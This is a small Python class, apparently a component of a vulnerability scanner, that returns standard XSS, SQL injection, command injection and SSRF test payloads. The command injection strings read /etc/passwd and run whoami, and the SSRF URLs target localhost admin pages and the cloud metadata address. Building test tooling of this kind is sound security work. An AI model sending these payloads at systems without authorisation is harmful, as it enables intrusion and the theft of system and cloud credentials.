class PayloadGenerator:
    """
    Provides standard, educational payloads for basic vulnerability testing.
    """
    
    @staticmethod
    def get_xss_payloads():
        return [
            "<script>alert('XSS_TEST_SUCCESS')</script>",
            "\"><script>alert('XSS_TEST_SUCCESS')</script>",
            "<img src=x onerror=alert('XSS_TEST_SUCCESS')>"
        ]
        
    @staticmethod
    def get_sqli_payloads():
        return [
            "' OR '1'='1",
            "' OR 1=1 --",
            "\" OR \"1\"=\"1",
            "admin' --",
            "' UNION SELECT 1,2,3 --"
        ]
        
    @staticmethod
    def get_cmdi_payloads():
        return [
            "127.0.0.1; cat /etc/passwd",
            "127.0.0.1 | whoami",
            "& type C:\\Windows\\win.ini"
        ]
        
    @staticmethod
    def get_ssrf_payloads():
        return [
            "http://127.0.0.1:5000/internal-admin",
            "http://localhost:5000/server-status",
            "http://169.254.169.254/latest/meta-data/"
        ]
